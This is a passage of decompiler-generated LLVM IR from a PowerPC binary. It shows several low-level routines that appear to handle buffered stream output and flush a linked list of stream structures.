  uselistorder i32 %v0_1000626c, { 1, 0 }
  uselistorder i32 %v0_10006284, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100061e8, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100061d8, { 1, 0 }
  uselistorder i32 %v1_100061d4, { 1, 0 }
  uselistorder i32 %v3_100061c8, { 1, 0, 2 }
  uselistorder i32 %v0_10006244, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10006214, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_100061a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000618c, { 1, 0 }
  uselistorder i32 %v2_10006180.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10006160, { 1, 0 }
  uselistorder i32 %v1_10006148, { 1, 2, 0 }
  uselistorder i32 %v0_1000613c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32)* @function_10006088, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000e080.234 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100065cc, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100065bc, { 1, 0 }
  uselistorder label %dec_label_pc_10006588, { 1, 0 }
  uselistorder label %dec_label_pc_10006558, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100064e4, { 1, 0 }
  uselistorder label %dec_label_pc_100064d0, { 1, 0 }
  uselistorder label %dec_label_pc_10006494, { 1, 0 }
  uselistorder label %dec_label_pc_100063dc, { 1, 0 }
  uselistorder label %dec_label_pc_10006388, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006338, { 1, 0 }
  uselistorder label %dec_label_pc_1000630c, { 1, 0 }
  uselistorder label %dec_label_pc_100062c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100062bc, { 1, 0 }
  uselistorder label %dec_label_pc_10006230, { 1, 0 }
  uselistorder label %dec_label_pc_10006228, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100061c8, { 1, 0 }
  uselistorder label %dec_label_pc_100061c4, { 1, 0 }
  uselistorder label %dec_label_pc_100061b0, { 1, 0 }
  uselistorder label %dec_label_pc_10006190, { 1, 0 }
  uselistorder label %dec_label_pc_1000618c, { 1, 0 }
  uselistorder label %dec_label_pc_10006170, { 1, 0 }
}

define i32 @function_100065e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100065e0:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100065e8 = call i32 @__asm_mfcr()
  store i32 %v0_100065e8, i32* %r31.global-to-local, align 4
  %v2_1000660c = add i32 %v0_100065e8, 52
  %v3_1000660c = inttoptr i32 %v2_1000660c to i32*
  %v4_1000660c = load i32, i32* %v3_1000660c, align 4
  %v2_10006610 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006610, i32* @r3, align 4
  %v3_10006614 = icmp eq i32 %v4_1000660c, 0
  store i1 %v3_10006614, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10006614, label %dec_label_pc_10006628, label %dec_label_pc_10006628.thread

dec_label_pc_10006628.thread:                     ; preds = %dec_label_pc_100065e0
  %v1_100066303 = inttoptr i32 %v0_100065e8 to i16*
  %v2_100066304 = load i16, i16* %v1_100066303, align 2
  %v3_100066305 = zext i16 %v2_100066304 to i32
  store i32 %v3_100066305, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000663c

dec_label_pc_10006628:                            ; preds = %dec_label_pc_100065e0
  %v0_1000661c = call i32 @function_10008c80()
  %v0_10006624 = call i32 @function_10008c78()
  %v0_10006630.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006634.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_10006610, i32* @r3, align 4
  %v1_10006630 = inttoptr i32 %v0_10006630.pre to i16*
  %v2_10006630 = load i16, i16* %v1_10006630, align 2
  %v3_10006630 = zext i16 %v2_10006630 to i32
  store i32 %v3_10006630, i32* %r31.global-to-local, align 4
  br i1 %v0_10006634.pre, label %dec_label_pc_10006638, label %dec_label_pc_1000663c

dec_label_pc_10006638:                            ; preds = %dec_label_pc_10006628
  %v0_10006638 = call i32 @function_10008c80()
  br label %dec_label_pc_1000663c

dec_label_pc_1000663c:                            ; preds = %dec_label_pc_10006628.thread, %dec_label_pc_10006628, %dec_label_pc_10006638
  %v3_100066306 = phi i32 [ %v3_100066305, %dec_label_pc_10006628.thread ], [ %v3_10006630, %dec_label_pc_10006628 ], [ %v3_10006630, %dec_label_pc_10006638 ]
  %v1_10006640 = call i32 @__asm_rlwinm(i32 %v3_100066306, i32 0, i32 29, i32 29)
  %v1_10006654 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100065e8)
  ret i32 %v1_10006640

; uselistorder directives
  uselistorder i32 %v0_100065e8, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000663c, { 2, 1, 0 }
}

define i32 @function_1000665c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000665c:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006664 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10006664, i32* %r28.global-to-local, align 4
  %v2_1000668c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000668c, i32* @r3, align 4
  %v1_10006690 = add i32 %arg3, 52
  %v2_10006690 = inttoptr i32 %v1_10006690 to i32*
  %v3_10006690 = load i32, i32* %v2_10006690, align 4
  %v3_10006698 = icmp eq i32 %v3_10006690, 0
  store i1 %v3_10006698, i1* @cr4_eq, align 1
  br i1 %v3_10006698, label %dec_label_pc_100066a0, label %dec_label_pc_100066ac

dec_label_pc_100066a0:                            ; preds = %dec_label_pc_1000665c
  %v0_100066a0 = call i32 @function_10008c80()
  %v0_100066a8 = call i32 @function_10008c78()
  %v0_100066ac.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100066b0.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100066b4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100066ac

dec_label_pc_100066ac:                            ; preds = %dec_label_pc_1000665c, %dec_label_pc_100066a0
  %v0_100066b4 = phi i32 [ %v0_10006664, %dec_label_pc_1000665c ], [ %v0_100066b4.pre, %dec_label_pc_100066a0 ]
  %v0_100066b0 = phi i32 [ %arg3, %dec_label_pc_1000665c ], [ %v0_100066b0.pre, %dec_label_pc_100066a0 ]
  %v0_100066ac = phi i32 [ %arg2, %dec_label_pc_1000665c ], [ %v0_100066ac.pre, %dec_label_pc_100066a0 ]
  store i32 268461756, i32* @lr, align 4
  %v3_100066b8 = inttoptr i32 %v0_100066b4 to i8*
  %v4_100066b8 = call i32 @function_10006a8c(i8* %v3_100066b8, i32 %v0_100066ac, i32 %v0_100066b0)
  store i32 %v4_100066b8, i32* @r31, align 4
  store i32 %v2_1000668c, i32* @r3, align 4
  %v0_100066c8 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100066c8, label %dec_label_pc_100066cc, label %dec_label_pc_100066d0

dec_label_pc_100066cc:                            ; preds = %dec_label_pc_100066ac
  %v0_100066cc = call i32 @function_10008c80()
  %v0_100066d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100066d0

dec_label_pc_100066d0:                            ; preds = %dec_label_pc_100066ac, %dec_label_pc_100066cc
  %v0_100066d4 = phi i32 [ %v4_100066b8, %dec_label_pc_100066ac ], [ %v0_100066d4.pre, %dec_label_pc_100066cc ]
  %v1_100066e8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006664)
  ret i32 %v0_100066d4

; uselistorder directives
  uselistorder i32 %v0_10006664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100066d0, { 1, 0 }
  uselistorder label %dec_label_pc_100066ac, { 1, 0 }
}

define i32 @function_100066f0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100066f0:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_100066fc = add i32 %arg2, 56
  store i32 %v1_100066fc, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v1_10006710 = add i32 %arg2, 52
  %v2_10006710 = inttoptr i32 %v1_10006710 to i32*
  %v3_10006710 = load i32, i32* %v2_10006710, align 4
  %v3_10006714 = icmp eq i32 %v3_10006710, 0
  br i1 %v3_10006714, label %dec_label_pc_1000674c, label %dec_label_pc_1000671c

dec_label_pc_1000671c:                            ; preds = %dec_label_pc_100066f0
  %v1_1000671c = add i32 %arg2, 16
  %v2_1000671c = inttoptr i32 %v1_1000671c to i32*
  %v3_1000671c = load i32, i32* %v2_1000671c, align 4
  %v1_100067201 = zext i8 %arg1 to i32
  store i32 %v1_100067201, i32* %r30.global-to-local, align 4
  %v1_10006724 = add i32 %arg2, 28
  %v2_10006724 = inttoptr i32 %v1_10006724 to i32*
  %v3_10006724 = load i32, i32* %v2_10006724, align 4
  %v2_10006728 = add i32 %v3_1000671c, 1
  store i32 %v2_10006728, i32* %r11.global-to-local, align 4
  %v3_1000672c = icmp ult i32 %v3_1000671c, %v3_10006724
  br i1 %v3_1000672c, label %dec_label_pc_10006734, label %dec_label_pc_10006740

dec_label_pc_10006734:                            ; preds = %dec_label_pc_1000671c
  %v4_1000671c = inttoptr i32 %v3_1000671c to i8*
  store i8 %arg1, i8* %v4_1000671c, align 1
  %v0_10006738 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10006738, i32* %v2_1000671c, align 4
  br label %dec_label_pc_100067a4

dec_label_pc_10006740:                            ; preds = %dec_label_pc_1000671c
  store i32 268461892, i32* @lr, align 4
  %v4_10006740 = trunc i32 %v1_100066fc to i8
  %v5_10006740 = call i32 @function_10006b50(i8 %v4_10006740, i32 %v3_1000671c, i32 %v1_100066fc)
  store i32 %v5_10006740, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100067a4

dec_label_pc_1000674c:                            ; preds = %dec_label_pc_100066f0
  %v2_10006750 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006750, i32* @r3, align 4
  %v0_10006758 = call i32 @function_10008c80()
  %v0_10006760 = call i32 @function_10008c78()
  %v0_10006764 = load i32, i32* @r31, align 4
  %v1_10006764 = add i32 %v0_10006764, 16
  %v2_10006764 = inttoptr i32 %v1_10006764 to i32*
  %v3_10006764 = load i32, i32* %v2_10006764, align 4
  %v1_10006768 = add i32 %v0_10006764, 28
  %v2_10006768 = inttoptr i32 %v1_10006768 to i32*
  %v3_10006768 = load i32, i32* %v2_10006768, align 4
  %v0_10006770 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006770 = urem i32 %v0_10006770, 256
  store i32 %v1_10006770, i32* %r30.global-to-local, align 4
  %v2_10006778 = add i32 %v3_10006764, 1
  store i32 %v2_10006778, i32* %r11.global-to-local, align 4
  %v3_1000677c = icmp ult i32 %v3_10006764, %v3_10006768
  br i1 %v3_1000677c, label %dec_label_pc_10006784, label %dec_label_pc_10006790

dec_label_pc_10006784:                            ; preds = %dec_label_pc_1000674c
  %v4_10006764 = inttoptr i32 %v3_10006764 to i8*
  %v1_10006784 = trunc i32 %v0_10006770 to i8
  store i8 %v1_10006784, i8* %v4_10006764, align 1
  %v0_10006788 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006788 = load i32, i32* @r31, align 4
  %v2_10006788 = add i32 %v1_10006788, 16
  %v3_10006788 = inttoptr i32 %v2_10006788 to i32*
  store i32 %v0_10006788, i32* %v3_10006788, align 4
  br label %dec_label_pc_10006798

dec_label_pc_10006790:                            ; preds = %dec_label_pc_1000674c
  %v1_10006774 = trunc i32 %v0_10006770 to i8
  store i32 268461972, i32* @lr, align 4
  %v6_10006790 = call i32 @function_10006b50(i8 %v1_10006774, i32 %v0_10006764, i32 %v3_10006764)
  store i32 %v6_10006790, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006798

dec_label_pc_10006798:                            ; preds = %dec_label_pc_10006784, %dec_label_pc_10006790
  store i32 %v2_10006750, i32* @r3, align 4
  %v0_100067a0 = call i32 @function_10008c80()
  br label %dec_label_pc_100067a4

dec_label_pc_100067a4:                            ; preds = %dec_label_pc_10006740, %dec_label_pc_10006734, %dec_label_pc_10006798
  %v0_100067a8 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_100067a8

; uselistorder directives
  uselistorder i32 %v0_10006770, { 2, 1, 0 }
  uselistorder i32 %v3_10006764, { 0, 3, 1, 2 }
  uselistorder i32 %v0_10006764, { 1, 0, 2 }
  uselistorder i32 %v3_1000671c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_100066fc, { 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i8, i32, i32)* @function_10006b50, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100067a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006798, { 1, 0 }
}

define i32 @function_100067bc() local_unnamed_addr {
dec_label_pc_100067bc:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008c78.194 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r29, align 4
  %v2_100067e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100067e0, i32* @r3, align 4
  %v0_100067e8 = call i32 @function_10008c80()
  %v0_100067f0 = call i32 @function_10008c78()
  %v3_100067f8 = load i32, i32* @global_var_10010494.196, align 4
  %v3_100067fc = icmp eq i32 %v3_100067f8, 1
  br i1 %v3_100067fc, label %dec_label_pc_10006804, label %dec_label_pc_100068ac

dec_label_pc_10006804:                            ; preds = %dec_label_pc_100067bc
  %v3_10006808 = load i32, i32* @global_var_10010498.197, align 4
  %tmp7 = icmp slt i32 %v3_10006808, 1
  br i1 %tmp7, label %dec_label_pc_100068ac, label %dec_label_pc_10006814

dec_label_pc_10006814:                            ; preds = %dec_label_pc_10006804
  %v2_10006820 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006820, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000682c = call i32 @function_10008c80()
  %v0_10006834 = call i32 @function_10008c78()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000688c11 = icmp eq i32 %storemerge8, 0
  %v0_1000689012 = load i32, i32* @r30, align 4
  br i1 %v3_1000688c11, label %dec_label_pc_10006898, label %dec_label_pc_10006844

dec_label_pc_10006844:                            ; preds = %dec_label_pc_10006814, %dec_label_pc_1000688c.backedge
  %v0_1000689017 = phi i32 [ %v0_10006890, %dec_label_pc_1000688c.backedge ], [ %v0_1000689012, %dec_label_pc_10006814 ]
  %v3_1000689018.in = phi i32 [ %v0_10006890, %dec_label_pc_1000688c.backedge ], [ %v0_1000689012, %dec_label_pc_10006814 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_1000688c.backedge ], [ %storemerge8, %dec_label_pc_10006814 ]
  %v1_10006844 = inttoptr i32 %storemerge16 to i16*
  %v2_10006844 = load i16, i16* %v1_10006844, align 2
  %v1_10006848 = add i32 %storemerge16, 32
  %v2_10006848 = inttoptr i32 %v1_10006848 to i32*
  %v3_10006848 = load i32, i32* %v2_10006848, align 4
  store i32 %v3_10006848, i32* @r31, align 4
  %v1_1000684c = and i16 %v2_10006844, -32720
  %v3_10006850 = icmp eq i16 %v1_1000684c, 48
  br i1 %v3_10006850, label %dec_label_pc_10006860, label %dec_label_pc_10006858

dec_label_pc_10006858:                            ; preds = %dec_label_pc_10006844
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_1000688c.backedge

dec_label_pc_10006860:                            ; preds = %dec_label_pc_10006844
  %v3_1000689018 = icmp eq i32 %v3_1000689018.in, 0
  br i1 %v3_1000689018, label %dec_label_pc_10006864, label %dec_label_pc_10006870

dec_label_pc_10006864:                            ; preds = %dec_label_pc_10006860
  store i32 %v3_10006848, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  br label %dec_label_pc_10006874

dec_label_pc_10006870:                            ; preds = %dec_label_pc_10006860
  %v2_10006870 = add i32 %v0_1000689017, 32
  %v3_10006870 = inttoptr i32 %v2_10006870 to i32*
  store i32 %v3_10006848, i32* %v3_10006870, align 4
  %v0_10006874.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10006874

dec_label_pc_10006874:                            ; preds = %dec_label_pc_10006864, %dec_label_pc_10006870
  %v0_10006874 = phi i32 [ %storemerge16, %dec_label_pc_10006864 ], [ %v0_10006874.pre, %dec_label_pc_10006870 ]
  %v1_10006874 = inttoptr i32 %v0_10006874 to i16*
  %v2_10006874 = load i16, i16* %v1_10006874, align 2
  %v1_1000687c = and i16 %v2_10006874, 8192
  %v3_1000687c = icmp eq i16 %v1_1000687c, 0
  br i1 %v3_1000687c, label %dec_label_pc_1000688c.backedge, label %dec_label_pc_10006884

dec_label_pc_1000688c.backedge:                   ; preds = %dec_label_pc_10006874, %dec_label_pc_10006858, %dec_label_pc_10006884
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000688c = icmp eq i32 %storemerge, 0
  %v0_10006890 = load i32, i32* @r30, align 4
  br i1 %v3_1000688c, label %dec_label_pc_10006898, label %dec_label_pc_10006844

dec_label_pc_10006884:                            ; preds = %dec_label_pc_10006874
  store i32 268462216, i32* @lr, align 4
  %v2_10006884 = call i32 @function_10007e44(i32 %v0_10006874)
  br label %dec_label_pc_1000688c.backedge

dec_label_pc_10006898:                            ; preds = %dec_label_pc_1000688c.backedge, %dec_label_pc_10006814
  store i32 %v2_10006820, i32* @r3, align 4
  %v0_100068a0 = call i32 @function_10008c80()
  %v0_100068a8 = load i32, i32* @r29, align 4
  store i32 %v0_100068a8, i32* @global_var_10010498.197, align 4
  %v3_100068b4.pre = load i32, i32* @global_var_10010494.196, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_100067bc, %dec_label_pc_10006804, %dec_label_pc_10006898
  %v3_100068b4 = phi i32 [ %v3_100067f8, %dec_label_pc_100067bc ], [ 1, %dec_label_pc_10006804 ], [ %v3_100068b4.pre, %dec_label_pc_10006898 ]
  store i32 %v2_100067e0, i32* @r3, align 4
  %v1_100068bc = add i32 %v3_100068b4, -1
  store i32 %v1_100068bc, i32* @global_var_10010494.196, align 4
  %v0_100068c4 = call i32 @function_10008c80()
  ret i32 %v0_100068c4

; uselistorder directives
  uselistorder i32 %v0_10006890, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10006874, { 1, 0 }
  uselistorder i32 %v3_10006848, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100068ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000688c.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006874, { 1, 0 }
  uselistorder label %dec_label_pc_10006844, { 1, 0 }
}

define i32 @function_100068dc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100068dc:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10010438.217 to i32), i32* %r9.global-to-local, align 4
  %v5_100068ec = icmp eq i16* %arg1, bitcast (i32** @global_var_10010438.217 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_100068ec, label %dec_label_pc_10006910, label %dec_label_pc_10006904

dec_label_pc_10006904:                            ; preds = %dec_label_pc_100068dc
  %v4_10006904 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10006904, label %dec_label_pc_10006910, label %dec_label_pc_10006a3c

dec_label_pc_10006910:                            ; preds = %dec_label_pc_10006904, %dec_label_pc_100068dc
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008c78.194 to i32), i32* @r30, align 4
  %v2_1000691c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000691c, i32* @r3, align 4
  %v0_10006930 = call i32 @function_10008c80()
  %v0_10006938 = call i32 @function_10008c78()
  %v3_10006940 = load i32, i32* @global_var_10010494.196, align 4
  store i32 %v2_1000691c, i32* @r3, align 4
  %v1_10006954 = add i32 %v3_10006940, 1
  store i32 %v1_10006954, i32* %r9.global-to-local, align 4
  store i32 %v1_10006954, i32* @global_var_10010494.196, align 4
  %v0_1000695c = call i32 @function_10008c80()
  store i32 %v2_1000691c, i32* @r3, align 4
  %v0_1000696c = call i32 @function_10008c80()
  %v0_10006974 = call i32 @function_10008c78()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000697c = load i32, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  store i32 %v3_1000697c, i32* @r31, align 4
  store i32 %v2_1000691c, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  %v0_1000698c = call i32 @function_10008c80()
  %v0_10006a2c.pr = load i32, i32* @r31, align 4
  %v3_10006a2c3 = icmp eq i32 %v0_10006a2c.pr, 0
  br i1 %v3_10006a2c3, label %dec_label_pc_10006a34, label %dec_label_pc_10006994

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006910, %dec_label_pc_10006a28
  %v0_100069b0 = phi i32 [ %v3_10006a28, %dec_label_pc_10006a28 ], [ %v0_10006a2c.pr, %dec_label_pc_10006910 ]
  %v1_10006994 = inttoptr i32 %v0_100069b0 to i16*
  %v2_10006994 = load i16, i16* %v1_10006994, align 2
  %v3_10006994 = zext i16 %v2_10006994 to i32
  %v1_10006998 = and i32 %v3_10006994, 64
  store i32 %v1_10006998, i32* %r9.global-to-local, align 4
  %v3_10006998 = icmp eq i32 %v1_10006998, 0
  br i1 %v3_10006998, label %dec_label_pc_10006a28, label %dec_label_pc_100069a0

dec_label_pc_100069a0:                            ; preds = %dec_label_pc_10006994
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100069a4 = load i32, i32* @global_var_1001043c.215, align 4
  %v3_100069a8 = icmp eq i32 %v3_100069a4, 2
  br i1 %v3_100069a8, label %dec_label_pc_100069cc, label %dec_label_pc_100069b0

dec_label_pc_100069b0:                            ; preds = %dec_label_pc_100069a0
  store i32 %v2_1000691c, i32* @r3, align 4
  %v0_100069c0 = call i32 @function_10008c80()
  %v0_100069c8 = call i32 @function_10008c78()
  %v0_100069cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100069cc

dec_label_pc_100069cc:                            ; preds = %dec_label_pc_100069a0, %dec_label_pc_100069b0
  %v0_100069e0 = phi i32 [ %v0_100069b0, %dec_label_pc_100069a0 ], [ %v0_100069cc.pre, %dec_label_pc_100069b0 ]
  %v1_100069cc = inttoptr i32 %v0_100069e0 to i16*
  %v2_100069cc = load i16, i16* %v1_100069cc, align 2
  %v3_100069cc = zext i16 %v2_100069cc to i32
  %v0_100069d0 = load i32, i32* @r27, align 4
  %v2_100069d0 = or i32 %v0_100069d0, %v3_100069cc
  %v1_100069d4 = and i32 %v2_100069d0, 832
  %v1_100069d8 = xor i32 %v1_100069d4, 320
  store i32 %v1_100069d8, i32* %r9.global-to-local, align 4
  %v3_100069d8 = icmp eq i32 %v1_100069d8, 0
  br i1 %v3_100069d8, label %dec_label_pc_100069e0, label %dec_label_pc_10006a0c

dec_label_pc_100069e0:                            ; preds = %dec_label_pc_100069cc
  store i32 %v0_100069e0, i32* @r3, align 4
  store i32 268462568, i32* @lr, align 4
  %v0_100069e4 = call i32 @function_10005548()
  %v3_100069e8 = icmp eq i32 %v0_100069e4, 0
  br i1 %v3_100069e8, label %dec_label_pc_100069f8, label %dec_label_pc_100069f0

dec_label_pc_100069f0:                            ; preds = %dec_label_pc_100069e0
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10006a0c

dec_label_pc_100069f8:                            ; preds = %dec_label_pc_100069e0
  %v0_100069f8 = load i32, i32* @r31, align 4
  %v1_100069f8 = inttoptr i32 %v0_100069f8 to i16*
  %v2_100069f8 = load i16, i16* %v1_100069f8, align 2
  %v3_100069f8 = zext i16 %v2_100069f8 to i32
  %v1_100069fc = add i32 %v0_100069f8, 8
  %v2_100069fc = inttoptr i32 %v1_100069fc to i32*
  %v3_100069fc = load i32, i32* %v2_100069fc, align 4
  store i32 %v3_100069fc, i32* %r9.global-to-local, align 4
  %v1_10006a00 = call i32 @__asm_rlwinm(i32 %v3_100069f8, i32 0, i32 26, i32 24)
  %v2_10006a00 = trunc i32 %v1_10006a00 to i16
  %v1_10006a04 = load i32, i32* @r31, align 4
  %v2_10006a04 = add i32 %v1_10006a04, 28
  %v3_10006a04 = inttoptr i32 %v2_10006a04 to i32*
  store i32 %v3_100069fc, i32* %v3_10006a04, align 4
  %v3_10006a08 = load i32, i32* @r31, align 4
  %v4_10006a08 = inttoptr i32 %v3_10006a08 to i16*
  store i16 %v2_10006a00, i16* %v4_10006a08, align 2
  br label %dec_label_pc_10006a0c

dec_label_pc_10006a0c:                            ; preds = %dec_label_pc_100069cc, %dec_label_pc_100069f0, %dec_label_pc_100069f8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006a10 = load i32, i32* @global_var_1001043c.215, align 4
  %v3_10006a14 = icmp eq i32 %v3_10006a10, 2
  br i1 %v3_10006a14, label %dec_label_pc_10006a28, label %dec_label_pc_10006a1c

dec_label_pc_10006a1c:                            ; preds = %dec_label_pc_10006a0c
  store i32 %v2_1000691c, i32* @r3, align 4
  %v0_10006a24 = call i32 @function_10008c80()
  br label %dec_label_pc_10006a28

dec_label_pc_10006a28:                            ; preds = %dec_label_pc_10006a0c, %dec_label_pc_10006994, %dec_label_pc_10006a1c
  %v0_10006a28 = load i32, i32* @r31, align 4
  %v1_10006a28 = add i32 %v0_10006a28, 32
  %v2_10006a28 = inttoptr i32 %v1_10006a28 to i32*
  %v3_10006a28 = load i32, i32* %v2_10006a28, align 4
  store i32 %v3_10006a28, i32* @r31, align 4
  %v3_10006a2c = icmp eq i32 %v3_10006a28, 0
  br i1 %v3_10006a2c, label %dec_label_pc_10006a34, label %dec_label_pc_10006994

dec_label_pc_10006a34:                            ; preds = %dec_label_pc_10006a28, %dec_label_pc_10006910
  store i32 ptrtoint (i32* @global_var_10006a38.242 to i32), i32* @lr, align 4
  %v0_10006a34 = call i32 @function_100067bc()
  br label %dec_label_pc_10006a74

dec_label_pc_10006a3c:                            ; preds = %dec_label_pc_10006904
  %v3_10006a3c = load i16, i16* %arg1, align 2
  %v4_10006a3c = zext i16 %v3_10006a3c to i32
  store i32 0, i32* @r28, align 4
  %v1_10006a44 = and i32 %v4_10006a3c, 64
  store i32 %v1_10006a44, i32* %r9.global-to-local, align 4
  %v3_10006a44 = icmp eq i32 %v1_10006a44, 0
  br i1 %v3_10006a44, label %dec_label_pc_10006a74, label %dec_label_pc_10006a4c

dec_label_pc_10006a4c:                            ; preds = %dec_label_pc_10006a3c
  store i32 268462672, i32* @lr, align 4
